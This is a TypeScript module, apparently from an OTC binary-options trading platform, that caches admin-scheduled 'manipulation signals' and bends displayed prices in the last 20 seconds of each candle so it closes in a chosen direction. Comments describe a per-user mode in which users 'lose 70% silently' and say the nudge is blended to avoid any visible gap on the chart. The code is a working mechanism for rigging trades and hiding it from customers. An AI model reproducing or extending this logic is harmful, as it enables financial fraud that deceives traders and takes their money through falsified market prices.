// Manipulation cache — keeps the active signal set in memory so the
// per-tick loop doesn't hit the DB at 10Hz. Refreshed by a periodic
// tick (every 5s) and on-demand when admin mutates a signal.

import { prisma } from '../../../prisma.js'
import { getLiquiditySignalsForAsset } from '../../../operations/liquidityManipulation.js'

export interface ActiveSignal {
  id:          string
  assetId:     string
  scheduledAt: number  // epoch ms
  timeframe:   number
  direction:   'CALL' | 'PUT'
}

// In-memory cache, keyed by assetId. Each asset has 0+ active signals
// sorted by scheduledAt ASC so the per-tick check can early-return after
// finding the first relevant one.
const cache: Map<string, ActiveSignal[]> = new Map()
let masterEnabled = false
let lastRefreshAt = 0
const REFRESH_INTERVAL_MS = 5_000

export function isMasterEnabled(): boolean {
  return masterEnabled
}

export function getSignalsForAsset(assetId: string): ActiveSignal[] {
  // Two sources, both keyed by assetId:
  //   1. Admin-scheduled signals (cached from otc_manipulation_signals,
  //      refreshed every 5s — the original "Motor de Manipulação OTC").
  //   2. Per-op liquidity signals injected by createOperation when a
  //      User.liquidityMode user's 70% loss roll fired. Live in-memory
  //      only, no DB hit. Merging here means downstream consumers
  //      (maybeManipulatePrice, isSlotUnderManipulation) work unchanged
  //      — they just see "more signals" without caring about origin.
  //
  // Liquidity signals carry an `opId` instead of admin's `id`; we map
  // it to the ActiveSignal shape using scheduledAt = slotEndMs so
  // existing slot-match logic (scheduledAt < slotEndMs) treats them
  // identically.
  const admin = cache.get(assetId) ?? []
  const liq   = getLiquiditySignalsForAsset(assetId)
  if (liq.length === 0) return admin
  const mapped: ActiveSignal[] = liq.map((s) => ({
    id:          `liquidity:${s.opId}`,
    assetId:     s.assetId,
    // Anchor to a tick INSIDE the slot, not the slot end (otherwise the
    // signal would only "activate" after expiry). Place it 1ms before
    // the slot end so the slot-window predicate matches throughout the
    // slot's life.
    scheduledAt: s.slotEndMs - 1,
    timeframe:   60,   // liquidity signals always target the M1 slot
    direction:   s.direction,
  }))
  // Merge + re-sort by scheduledAt ASC so consumers' early-exit logic
  // (sorted scan, break when past slot end) keeps working.
  return [...admin, ...mapped].sort((a, b) => a.scheduledAt - b.scheduledAt)
}

// Reload from DB. Cheap — runs every 5s in background. Also called on
// admin mutations via a future bus event (not wired yet — 5s lag is
// acceptable for a manipulation window since admin schedules ahead).
export async function refreshManipulationCache(): Promise<void> {
  try {
    const [settings, signals] = await Promise.all([
      prisma.$queryRaw<Array<{ enabled: boolean }>>`
        SELECT enabled FROM otc_manipulation_settings WHERE id = 'global' LIMIT 1
      `,
      // Only signals in the future or within the last 5 minutes (catches
      // edge case of a signal that just expired but engine should still
      // honour it for the in-progress candle).
      prisma.$queryRaw<Array<{
        id: string; assetId: string; scheduledAt: Date; timeframe: number;
        direction: string;
      }>>`
        SELECT id, "assetId", "scheduledAt", timeframe, direction
        FROM otc_manipulation_signals
        WHERE enabled = TRUE
          AND "scheduledAt" > NOW() - INTERVAL '5 minutes'
        ORDER BY "assetId", "scheduledAt" ASC
      `,
    ])

    masterEnabled = settings[0]?.enabled ?? false

    // Rebuild the per-asset cache.
    cache.clear()
    for (const s of signals) {
      const arr = cache.get(s.assetId) ?? []
      arr.push({
        id:          s.id,
        assetId:     s.assetId,
        scheduledAt: s.scheduledAt.getTime(),
        timeframe:   s.timeframe,
        direction:   s.direction as 'CALL' | 'PUT',
      })
      cache.set(s.assetId, arr)
    }

    lastRefreshAt = Date.now()
  } catch (err) {
    console.error('[manipulation] cache refresh failed:', err)
  }
}

let refreshTimer: ReturnType<typeof setInterval> | null = null

export function startManipulationRefresh(): void {
  if (refreshTimer) return
  void refreshManipulationCache()  // immediate
  refreshTimer = setInterval(() => void refreshManipulationCache(), REFRESH_INTERVAL_MS)
}

export function stopManipulationRefresh(): void {
  if (refreshTimer) {
    clearInterval(refreshTimer)
    refreshTimer = null
  }
}

// Returns whether the engine should consider any of the slot-shaping
// helpers (wick injection, streak break) at this tick. When true, those
// helpers should skip — they'd overwrite the carefully-blended
// manipulation tick and create a visible gap on the chart.
export function isSlotUnderManipulation(
  assetId:      string,
  candleOpenMs: number,
  timeframe:    number,
): boolean {
  if (!masterEnabled) return false
  // Use the merged source (admin cache + per-op liquidity signals) so
  // wick-injection / streak-break helpers skip on liquidity-nudged
  // slots too — otherwise the wick logic could overwrite the blended
  // tick and leave a visible gap.
  const signals = getSignalsForAsset(assetId)
  if (signals.length === 0) return false
  const slotEndMs = candleOpenMs + timeframe * 1000
  for (const s of signals) {
    if (s.timeframe !== timeframe) continue
    if (s.scheduledAt < candleOpenMs) continue
    if (s.scheduledAt >= slotEndMs)   break
    return true
  }
  return false
}

// ── Per-tick application ─────────────────────────────────────────────────
// Given the current asset, the in-progress M1 candle's slot, and the
// raw price the engine just produced, returns the (possibly nudged)
// price that should be emitted. Surgical — only nudges:
//   1. master toggle is ON, AND
//   2. there's an active signal whose scheduledAt falls in this slot, AND
//   3. we're in the last NUDGE_WINDOW_MS of the slot, AND
//   4. the candle's current close direction doesn't match the target
//
// When all 4 conditions met, pushes price toward open + ε (CALL) or
// open - ε (PUT) so the candle finalises with the configured direction.

// Window during which the nudge is active. For M1 (60s slots) this means
// the first (60 - NUDGE_WINDOW_SEC) seconds tick 100% naturally — the
// engine's regime FSM, micro-dynamics + liquidity all drive price on
// their own — and only the final NUDGE_WINDOW_SEC blend toward target.
// 20s window on M1 = 40s natural + 20s smooth pull-to-target.
const NUDGE_WINDOW_MS = 20_000

// Target distance from open as a fraction of price. The final close
// lands near open*(1 ± NUDGE_MAGNITUDE). 35bp on EUR/USD at 1.085 ≈
// 38 pips — clearly larger than the typical natural M1 body (~10-15
// pips) so manipulated candles read as a decisive move on the chart
// instead of blending in with normal volatility.
const NUDGE_MAGNITUDE = 0.0035

export function maybeManipulatePrice(
  assetId:    string,
  candleOpenMs: number,
  candleOpenPrice: number,
  candleClosePrice: number,
  timeframe:  number,
  now:        number,
  rawPrice:   number,
): number {
  if (!masterEnabled) return rawPrice
  // Use the merged source (admin cache + per-op liquidity signals).
  // masterEnabled gates BOTH origins — admin turning the global toggle
  // OFF is a kill-switch that silences liquidity nudges too. The
  // resolver's force-loss marker still fires in that case (it lives
  // separately), so liquidity users still lose 70% silently — just
  // without the candle being moved.
  const signals = getSignalsForAsset(assetId)
  if (signals.length === 0) return rawPrice

  const slotEndMs = candleOpenMs + timeframe * 1000

  // Find a signal whose scheduledAt falls inside this slot. Signals are
  // sorted ASC so we can early-exit when we pass the slot end.
  let active: ActiveSignal | null = null
  for (const s of signals) {
    if (s.timeframe !== timeframe) continue
    if (s.scheduledAt < candleOpenMs) continue
    if (s.scheduledAt >= slotEndMs)   break
    active = s
    break
  }
  if (!active) return rawPrice

  // Only nudge in the final window of the slot — earlier ticks tick
  // naturally so the candle's body has visible movement before the
  // forced close. Outside the window, normal price.
  const msUntilEnd = slotEndMs - now
  if (msUntilEnd > NUDGE_WINDOW_MS) return rawPrice
  if (msUntilEnd <= 0) return rawPrice

  // Compute target price: nudge in chosen direction relative to open.
  const target = active.direction === 'CALL'
    ? candleOpenPrice * (1 + NUDGE_MAGNITUDE)
    : candleOpenPrice * (1 - NUDGE_MAGNITUDE)

  // Already on the right side? Don't waste a nudge — preserves natural
  // movement when the engine happens to be going the configured way.
  if (active.direction === 'CALL' && candleClosePrice >= candleOpenPrice * (1 + NUDGE_MAGNITUDE * 0.5)) {
    return rawPrice
  }
  if (active.direction === 'PUT' && candleClosePrice <= candleOpenPrice * (1 - NUDGE_MAGNITUDE * 0.5)) {
    return rawPrice
  }

  // Smooth blend: as time approaches slot end, blend more toward target.
  // At msUntilEnd = NUDGE_WINDOW_MS → 0% target; at msUntilEnd = 0 → 100% target.
  const blend = 1 - (msUntilEnd / NUDGE_WINDOW_MS)
  return rawPrice * (1 - blend) + target * blend
}
